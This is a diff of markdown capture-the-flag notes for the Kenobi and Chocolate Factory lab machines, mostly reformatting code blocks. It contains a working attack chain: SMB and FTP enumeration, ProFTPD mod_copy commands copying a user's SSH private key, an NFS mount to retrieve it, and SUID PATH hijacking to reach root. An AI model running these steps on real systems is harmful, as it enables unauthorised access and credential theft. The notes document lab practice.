@@ -382,13 +382,19 @@ nmap --interactive
 
 ## Kenobi
 
-```nmap -sC -sV <IP>```
+```
+nmap -sC -sV <IP>
+```
 
 We found smb port lets look for anonymous login
 
-```smbclient -L //<IP>```
+```
+smbclient -L //<IP>
+```
 
-```smbclient //10.49.133.202/anonymous```
+```
+smbclient //10.49.133.202/anonymous
+```
 
 We found a file called log.txt here
 
@@ -396,41 +402,52 @@ get log.txt (helped us to get it but we found nothing good)
 
 We found ProFTPD version 1.3.5
 
-```searchsploit ProFTPD 1.3.5```
+```
+searchsploit ProFTPD 1.3.5
+```
 
-```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.185.198```
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.185.198
+```
 
 ![enum result](Assets/8.png)
 
-```ncat 10.49.133.202 21```
+```
+ncat 10.49.133.202 21
+```
 
 Now we will copy id_rsa file
 
-```SITE CPFR /home/kenobi/.ssh/id_rsa```
+```
+SITE CPFR /home/kenobi/.ssh/id_rsa
+```
 
-```SITE CPTO /var/tmp/id_rsa```
+```
+SITE CPTO /var/tmp/id_rsa
+```
 
-  
+```
+sudo mkdir -p /mnt/kenobi
 
-```sudo mkdir -p /mnt/kenobi```
+mount <IP>:/var /mnt/kenobi```
 
-```mount <IP>:/var /mnt/kenobi```
+ls -la /mnt/kenobi
 
-```ls -la /mnt/kenobi```
+cp /mnt/kenobiNFS/tmp/id_rsa .
 
-```cp /mnt/kenobiNFS/tmp/id_rsa .```
+sudo chmod 600 id_rsa
 
-```sudo chmod 600 id_rsa```
-
-```ssh -i id_rsa kenobi@10.49.133.202```
+ssh -i id_rsa kenobi@10.49.133.202
+```
 
 ##### We found first flag after login
 
-  
 
 #### Privilege escalation
 
-```find / -perm -u=s -type f 2>/dev/null```
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
 In the list we found /usr/bin/menu a different thing which we can misuse
 
@@ -438,39 +455,66 @@ Put and run linpeas into that file
 
 After running linpeas we find an unknown binary
 
-```/usr/bin/menu```
+```
+/usr/bin/menu
+```
 
-```strings /usr/bin/menu```
+```
+strings /usr/bin/menu
+```
 
-```cd /tmp```
+```
+cd /tmp
+```
 
-```echo /bin/sh > curl```
+```
+echo /bin/sh > curl
+```
 
-```ls```
+```
+ls
+```
 
-```chmod 777 curl```
+```
+chmod 777 curl
+```
 
-```export PATH=/tmp:$PATH```
+```
+export PATH=/tmp:$PATH
+```
 
-```/usr/bin/menu```
+```
+/usr/bin/menu
+```
 
-```1```
+```
+1
+```
 
-```whoami ```
+```
+whoami 
+```
 
 ##### Now we are root
 
-```cd ..```
+```
+cd ..
+```
 
-```cd root```
+```
+cd root
+```
 
-```cat root.txt```
+```
+cat root.txt
+```
 
   
-
 ## Chocolate Factory
 
-```nmap -sC -sV <IP>```
+```
+nmap -sC -sV <IP>
+```
 
 ![enum result](Assets/9.png)
 
@@ -478,7 +522,6 @@ We found at port 113 that we have a key here
 
 If we go there we are automatically downloaded a file called key
 
-  
 
 ##### Now we cannot do cat into it
 
@@ -488,7 +531,9 @@ Let us run strings into it
 
 The strings command in Linux is used to extract and display human-readable text strings from binary or non-text files, such as executables, libraries, and object files
 
-```strings <file>```
+```
+strings <file>
+```
 
 ![enum result](Assets/11.png)
 ##### Found a key
@@ -499,7 +544,9 @@ We have an ftp port open and found it in our nmap scan and it has anonymous logi
 
 ![enum result](Assets/12.png)
 
-```ftp <ip>```
+```
+ftp <ip>
+```
 
 We did ftp login using credentials anonymous:anonymous
 
